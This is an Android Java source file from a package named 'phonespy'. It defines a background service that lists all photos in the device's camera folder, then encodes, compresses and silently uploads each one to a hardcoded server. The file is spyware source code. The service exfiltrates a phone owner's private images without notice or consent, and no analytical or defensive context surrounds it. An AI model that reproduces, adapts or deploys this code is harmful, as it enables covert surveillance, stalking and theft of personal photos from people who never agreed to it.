package info.peoce.phonespy.Server;

import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import info.peoce.phonespy.Util.Base64Util;
import info.peoce.phonespy.Util.GzipUtil;
import info.peoce.phonespy.Util.Others;

public class UploadPicServer extends Service {
    private String path = "";
    private List<String> fileList;
    private Bitmap bitmap;
    private static final String HOST = "http://192.168.0.100:8080/ImageServer/upServer";

    public UploadPicServer() {
    }

    @Override
    public void onCreate() {
        super.onCreate();
        fileList = getImagePathFromSD();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            public void run() {
                for (int i = 0; i < fileList.size(); i++) {
                    System.out.println(fileList.get(i));
                    bitmap = BitmapFactory.decodeFile(fileList.get(i));
                    upload();
                }
            }
        }).start();
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    // 从sd卡获取图片资源
    private List<String> getImagePathFromSD() {

        List<String> picList = new ArrayList();
        String imagePath = Environment.getExternalStorageDirectory().toString() + "/DCIM/Camera";
        System.out.println(imagePath);
        File mfile = new File(imagePath);
        File[] files = mfile.listFiles();

        for (File file : files) {
            if (new Others().checkIsImageFile(file.getPath())) {
                picList.add(file.getPath());
            }
        }
        return picList;
    }

    private void upload() {
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, stream);
        byte[] b = stream.toByteArray();
        // 将图片流以字符串形式存储下来
        String file = Base64Util.encodeLines(b);
        String gzipFile = GzipUtil.compress(file);
        HttpClient client = new DefaultHttpClient();
        // 设置上传参数
        List<NameValuePair> formparams = new ArrayList<NameValuePair>();
        formparams.add(new BasicNameValuePair("file", gzipFile));
        HttpPost post = new HttpPost(HOST);
        UrlEncodedFormEntity entity;
        try {
            entity = new UrlEncodedFormEntity(formparams, "UTF-8");
            post.addHeader("Accept",
                    "text/javascript, text/html, application/xml, text/xml");
            post.addHeader("Accept-Charset", "GBK,utf-8;q=0.7,*;q=0.3");
            post.addHeader("Accept-Encoding", "gzip,deflate,sdch");
            post.addHeader("Connection", "Keep-Alive");
            post.addHeader("Cache-Control", "no-cache");
            post.addHeader("Content-Type", "application/x-www-form-urlencoded");
            post.setEntity(entity);
            HttpResponse response = client.execute(post);
            HttpEntity e = response.getEntity();
            if (200 == response.getStatusLine().getStatusCode()) {
                System.out.println("上传完成");
                stream.close();
            } else {
                System.out.println("上传失败");
            }
            client.getConnectionManager().shutdown();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
